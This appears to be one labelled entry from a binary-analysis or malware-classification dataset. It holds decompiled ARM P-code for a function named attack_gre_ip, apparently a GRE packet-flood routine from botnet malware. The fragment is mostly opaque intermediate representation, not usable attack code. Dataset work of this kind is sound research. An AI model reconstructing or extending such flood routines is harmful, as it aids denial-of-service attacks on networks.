Label: 848
Function: attack_gre_ip
Architecture: arm
Source File: Unknown
Entry Point: 000151b0

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x10000348, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x3d, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x5f5, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x5f5, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x5f5, 4)
(unique, 0x100003dc, 4) CAST (register, 0x2c, 4)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffffa4, 4) , (const, 0x1, 4)
(register, 0x28, 4) INT_ZEXT (register, 0x20, 1)
(ram, 0x15a00, 4) MULTIEQUAL (ram, 0x15a00, 4) , (ram, 0x15a00, 4)
(ram, 0x15a04, 4) MULTIEQUAL (ram, 0x15a04, 4) , (ram, 0x15a04, 4)
(ram, 0x15a08, 4) MULTIEQUAL (ram, 0x15a08, 4) , (ram, 0x15a08, 4)
(stack, 0xffffffffffffffa4, 4) MULTIEQUAL (stack, 0xffffffffffffffa4, 4) , (register, 0x2c, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffb0, 4) MULTIEQUAL (stack, 0xffffffffffffffb0, 4) , (stack, 0xffffffffffffffb0, 4)
(stack, 0xffffffffffffffb4, 4) MULTIEQUAL (stack, 0xffffffffffffffb4, 4) , (stack, 0xffffffffffffffb4, 4)
(stack, 0xffffffffffffffd0, 4) MULTIEQUAL (stack, 0xffffffffffffffd0, 4) , (stack, 0xffffffffffffffd0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffda, 1) MULTIEQUAL (stack, 0xffffffffffffffda, 1) , (stack, 0xffffffffffffffda, 1)
(stack, 0xffffffffffffffdb, 1) MULTIEQUAL (stack, 0xffffffffffffffdb, 1) , (stack, 0xffffffffffffffdb, 1)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe2, 2) MULTIEQUAL (stack, 0xffffffffffffffe2, 2) , (stack, 0xffffffffffffffe2, 2)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe6, 1) MULTIEQUAL (stack, 0xffffffffffffffe6, 1) , (stack, 0xffffffffffffffe6, 1)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 2) MULTIEQUAL (stack, 0xffffffffffffffe8, 2) , (stack, 0xffffffffffffffe8, 2)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
(unique, 0x2480, 1) INT_SLESS (stack, 0xffffffffffffffa4, 4) , (unique, 0x100003a0, 4)
 ---  CBRANCH (ram, 0x1567c, 1) , (unique, 0x2480, 1)
(unique, 0x100003a0, 4) CAST (register, 0x28, 4)
(ram, 0x15a00, 4) MULTIEQUAL (ram, 0x15a00, 4) , (ram, 0x15a00, 4)
(ram, 0x15a04, 4) MULTIEQUAL (ram, 0x15a04, 4) , (ram, 0x15a04, 4)
(ram, 0x15a08, 4) MULTIEQUAL (ram, 0x15a08, 4) , (ram, 0x15a08, 4)
 ---  RETURN (const, 0x0, 4)
(ram, 0x15a00, 4) COPY (ram, 0x15a00, 4)
(ram, 0x15a04, 4) COPY (ram, 0x15a04, 4)
(ram, 0x15a08, 4) COPY (ram, 0x15a08, 4)
